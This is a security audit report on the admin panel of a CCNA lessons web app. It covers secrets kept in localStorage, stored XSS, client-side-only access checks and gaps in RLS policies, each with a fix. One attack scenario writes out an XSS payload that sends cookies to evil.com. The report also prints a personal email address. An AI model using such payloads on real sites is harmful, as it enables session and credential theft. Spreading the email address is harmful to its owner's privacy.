# Admin User Security Testing — CCNA_Lessons Project

**Audit Date:** 2026-08-05
**Target:** https://networklearn.wasmer.app
**Source Code:** /Users/andreastsiartas/Documents/CCNA_Lessons

---

## Findings Summary

| # | Severity | Finding | File(s) |
|---|----------|---------|---------|
| 1 | CRITICAL | Service role key stored in plaintext localStorage | admin.astro:276,772; admin.ts:16,68 |
| 2 | CRITICAL | All API secrets stored in plaintext localStorage | admin.astro:764,774,812; admin.ts:53,68 |
| 3 | HIGH | Stored XSS via unsanitized display_name in innerHTML | admin.astro:516,649; el/admin.astro:238 |
| 4 | HIGH | Stored XSS via logo URL in innerHTML | admin.astro:795 |
| 5 | HIGH | Admin access check is client-side only | admin.astro:421-438 |
| 6 | MEDIUM | Hardcoded admin email in 6+ locations | admin.ts:2; admin.astro:38; migrations 003,004,005 |
| 7 | MEDIUM | Admin auto-sets plan='pro' on every page load | admin.astro:444; el/admin.astro:201 |
| 8 | MEDIUM | increment_points RPC lacks point value validation | 004_security_fixes.sql:6-19 |
| 9 | MEDIUM | Admin UPDATE RLS policies missing for lesson_progress, quiz_scores, user_points | 005_admin_validation_db.sql |
| 10 | LOW | delete_user_account GRANTed to all authenticated users | 006_delete_account.sql:29 |
| 11 | LOW | email_encrypted column stores plaintext (misleading name) | 003_admin_email_access.sql:3,22 |
| 12 | INFORMATIONAL | Dead demo code with hardcoded user data in admin.ts | admin.ts:71-147 |

---

### [CRITICAL] Service Role Key Stored in Plaintext localStorage

**OWASP Category:** A04 - Insecure Design
**File(s):** `src/pages/en/admin.astro` (lines 276-278, 769-776), `src/lib/admin.ts` (lines 16, 68)

**Description:** The admin page contains an input field for the Supabase Service Role Key. When saved, it is stored in `localStorage` under `adminSettings.supabaseServiceKey`. The `type="password"` attribute provides only visual masking — the value is accessible via JavaScript.

**Evidence:**
```html
<label>Service Role Key (Secret)</label>
<input type="password" id="supabase-service-key" placeholder="eyJhbGciOiJIUzI1NiIs..." />
```
```javascript
localStorage.setItem('adminSettings', JSON.stringify({
  ...JSON.parse(localStorage.getItem('adminSettings') || '{}'),
  supabaseServiceKey: document.getElementById('supabase-service-key')?.value || '',
}));
```

**Impact:** The service role key bypasses ALL RLS policies. An attacker with this key can read, modify, or delete every row in every table, access auth.users, and pivot to Supabase management APIs.

**Remediation:** Remove service role key input from admin UI entirely. Use server-side Astro API routes for any operations requiring elevated privileges. Store the key as a server-side environment variable only.

---

### [CRITICAL] All API Secrets Stored in Plaintext localStorage

**OWASP Category:** A04 - Insecure Design
**File(s):** `src/pages/en/admin.astro` (lines 764, 774, 812), `src/lib/admin.ts` (lines 53, 68)

**Description:** The admin settings panel stores highly sensitive credentials in `localStorage` as plaintext JSON.

**Evidence:**
| Setting | Key in localStorage |
|---------|-------------------|
| Revolut API Key | `revolutApiKey` |
| Revolut Webhook Secret | `revolutWebhookSecret` |
| Revolut Merchant ID | `revolutMerchantId` |
| Supabase URL | `supabaseUrl` |
| Supabase Anon Key | `supabaseAnonKey` |
| Supabase Service Key | `supabaseServiceKey` |
| Stripe Public Key | `stripePublicKey` |
| Stripe Secret Key | `stripeSecretKey` |
| SMTP Host | `emailSmtpHost` |
| SMTP Username | `emailSmtpUser` |
| SMTP Password | `emailSmtpPass` |

**Impact:** Any XSS vulnerability can exfiltrate all these secrets. This would give an attacker: payment processing capabilities (Revolut/Stripe), full database access (Supabase service role), and email sending ability (SMTP credentials).

**Remediation:** Never store API secrets in localStorage. Move all secret storage server-side.

---

### [HIGH] Stored XSS via Unsanitized display_name in innerHTML

**OWASP Category:** A03 - Injection
**File(s):** `src/pages/en/admin.astro` (lines 507-533, 647-659), `src/pages/el/admin.astro` (line 238)

**Description:** The admin panel renders user data by interpolating user-controlled values (`display_name`, email) directly into HTML via `innerHTML` without sanitization.

**Evidence:**
```javascript
tableBody.innerHTML = profiles.map(p => {
  const userEmail = emailMap[p.id] || p.email || p.id.substring(0, 8) + '...';
  return `<tr ...>
    <td>${p.display_name || 'User'}</td>      // XSS HERE
    <td>${userEmail}</td>                       // XSS HERE
    <button data-user-name="${p.display_name || 'User'}" ...> // XSS in attribute
  </tr>`;
}).join('');
```

**Attack scenario:** A user registers with `display_name` set to `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`. When the admin views the Users tab, the HTML renders and the onerror event fires, exfiltrating cookies/session tokens. The localStorage secrets (service role key, API keys) could also be read and exfiltrated.

**Remediation:** Use `textContent` instead of `innerHTML`, or escape all interpolated values using an `escapeHtml()` function.

---

### [HIGH] Stored XSS via Logo URL in innerHTML

**OWASP Category:** A03 - Injection
**File(s):** `src/pages/en/admin.astro` (line 795)

**Description:** The logo preview function injects a user-controlled URL directly into an innerHTML assignment.

**Evidence:**
```javascript
preview.innerHTML = `<img src="${logoUrl}" alt="Logo" class="w-10 h-10 rounded-xl object-cover" onerror="this.parentElement.innerHTML='N'" />`;
```

**Remediation:** Use DOM APIs instead of innerHTML:
```javascript
const img = document.createElement('img');
img.src = logoUrl;
img.onerror = () => { preview.textContent = 'N'; };
preview.replaceChildren(img);
```

---

### [HIGH] Admin Access Check is Client-Side Only

**OWASP Category:** A01 - Broken Access Control
**File(s):** `src/pages/en/admin.astro` (lines 421-438)

**Description:** The admin page renders ALL admin content in the HTML and uses CSS classes (`hidden`) to show/hide it based on JavaScript authorization checks. The ENTIRE admin HTML is sent to every browser.

**Evidence:**
```html
<div id="admin-content" class="hidden">
  <!-- All admin tables, forms, settings are rendered here -->
</div>
```
```javascript
const { data: profile } = await supabase
  .from('profiles').select('is_admin').eq('id', session.user.id).single();
isAdmin = profile?.is_admin === true;
if (!isAdmin) {
  adminContent.classList.add('hidden');  // Just hides, doesn't remove from DOM
}
```

**Impact:** While RLS policies protect database queries, the full admin HTML is delivered to every visitor. A user could manipulate the DOM to remove the `hidden` class and interact with admin UI elements.

**Remediation:** Move admin authorization to middleware or server-side rendering. The admin HTML should never reach non-admin browsers.

---

### [MEDIUM] Hardcoded Admin Email in 6+ Locations

**OWASP Category:** A07 - Identification and Authentication Failures
**File(s):** `src/lib/admin.ts` (line 2), `src/pages/en/login.astro` (line 146), `src/pages/en/admin.astro` (line 38), `src/pages/el/admin.astro` (line 35), migrations 003, 004, 005

**Description:** The admin email `tsiartasantreas@gmail.com` is hardcoded in 6+ locations. While the database `is_admin` column is the primary check, the hardcoded email persists as a backup/reference.

**Remediation:** Remove all hardcoded admin email references. Admin status should be determined exclusively by the `profiles.is_admin` database column.

---

### [MEDIUM] Admin Auto-Sets plan='pro' on Every Page Load

**OWASP Category:** A01 - Broken Access Control
**File(s):** `src/pages/en/admin.astro` (line 444), `src/pages/el/admin.astro` (line 201)

**Description:** The admin page automatically upgrades the admin user to `plan: 'pro'` on every page load without any payment verification.

**Evidence:**
```javascript
// Auto-set admin to pro
await supabase.from('profiles').update({ plan: 'pro' }).eq('id', session.user.id);
```

**Impact:** While this only affects the admin user, it demonstrates a pattern where plan changes can be made without server-side payment verification.

---

### [MEDIUM] increment_points RPC Lacks Point Value Validation

**OWASP Category:** A04 - Insecure Design
**File(s):** `supabase/migrations/004_security_fixes.sql` (lines 6-19)

**Description:** While the RPC correctly validates that `auth.uid() == p_user_id`, it accepts any arbitrary `p_points` value from the client.

**Evidence:**
```sql
IF auth.uid() != p_user_id THEN
  RAISE EXCEPTION 'Cannot modify another user''s points';
END IF;
-- No validation on p_points value
UPDATE user_points SET total_points = total_points + p_points WHERE user_id = p_user_id;
```

**Impact:** A user could call `increment_points` with a very large number to artificially inflate their points.

**Remediation:** Add bounds checking: `IF p_points < 0 OR p_points > 100 THEN RAISE EXCEPTION`.

---

### [MEDIUM] Admin UPDATE RLS Policies Missing

**OWASP Category:** A01 - Broken Access Control
**File(s):** `supabase/migrations/005_admin_validation_db.sql`

**Description:** The admin RLS policies cover SELECT and DELETE on most tables, but UPDATE policies are missing for `lesson_progress`, `quiz_scores`, and `user_points`.

**Impact:** Admin cannot update these tables via RLS-protected queries (though the admin page doesn't currently need to).

---

### [LOW] delete_user_account GRANTed to All Authenticated Users

**OWASP Category:** A01 - Broken Access Control
**File(s):** `supabase/migrations/006_delete_account.sql` (line 29)

**Description:** The function is granted to the `authenticated` role, meaning any logged-in user can call it. Internal checks prevent deleting other users, but the broad grant increases attack surface.

---

### [LOW] email_encrypted Column Stores Plaintext

**OWASP Category:** A04 - Insecure Design
**File(s):** `supabase/migrations/003_admin_email_access.sql` (lines 3, 22)

**Description:** The column name `email_encrypted` is misleading — it stores plaintext email addresses, not encrypted ones.

---

### [INFORMATIONAL] Dead Demo Code in admin.ts

**File(s):** `src/lib/admin.ts` (lines 71-147)

**Description:** The admin.ts file contains hardcoded mock user data for development/demo purposes. This is dead code in production but could confuse future developers.

---

## RLS Policy Completeness Inventory

### Table: profiles (RLS ENABLED)
| Policy | Operation | Condition | Migration |
|--------|-----------|-----------|-----------|
| Users can view own profile | SELECT | auth.uid() = id | 001 |
| Users can update own profile | UPDATE | auth.uid() = id | 001 |
| Users can insert own profile | INSERT | auth.uid() = id | 001 |
| Users can delete own profile | DELETE | auth.uid() = id | 004 |
| Admin can view all profiles | SELECT | is_admin() | 005 |
| Admin can update any profile | UPDATE | is_admin() | 005 |
| Admin can delete any profile | DELETE | is_admin() | 005 |

### Table: lesson_progress (RLS ENABLED)
| Policy | Operation | Condition | Migration |
|--------|-----------|-----------|-----------|
| Users can view own | SELECT | auth.uid() = user_id | 001 |
| Users can insert own | INSERT | auth.uid() = user_id | 001 |
| Users can update own | UPDATE | auth.uid() = user_id | 001 |
| Users can delete own | DELETE | auth.uid() = user_id | 004 |
| Admin can view all | SELECT | is_admin() | 005 |
| Admin can delete any | DELETE | is_admin() | 005 |
| ⚠️ Missing: Admin UPDATE | — | — | — |

### Table: quiz_scores (RLS ENABLED)
| Policy | Operation | Condition | Migration |
|--------|-----------|-----------|-----------|
| Users can view own | SELECT | auth.uid() = user_id | 001 |
| Users can insert own | INSERT | auth.uid() = user_id | 001 |
| Users can delete own | DELETE | auth.uid() = user_id | 004 |
| Admin can view all | SELECT | is_admin() | 005 |
| Admin can delete any | DELETE | is_admin() | 005 |
| ⚠️ Missing: Admin UPDATE, User UPDATE | — | — | — |

### Table: user_points (RLS ENABLED)
| Policy | Operation | Condition | Migration |
|--------|-----------|-----------|-----------|
| Users can view own | SELECT | auth.uid() = user_id | 001 |
| Users can update own | UPDATE | auth.uid() = user_id | 001 |
| Users can insert own | INSERT | auth.uid() = user_id | 001 |
| Users can delete own | DELETE | auth.uid() = user_id | 004 |
| Admin can view all | SELECT | is_admin() | 005 |
| Admin can delete any | DELETE | is_admin() | 005 |
| ⚠️ Missing: Admin UPDATE | — | — | — |

### Table: admin_user_emails (RLS ENABLED)
| Policy | Operation | Condition | Migration |
|--------|-----------|-----------|-----------|
| Admin only access | ALL | is_admin() | 005 |
| ✅ Complete | — | — | — |

**Tables WITHOUT RLS:** None. All 5 tables have RLS enabled.
**Policies with `true` condition:** None found.
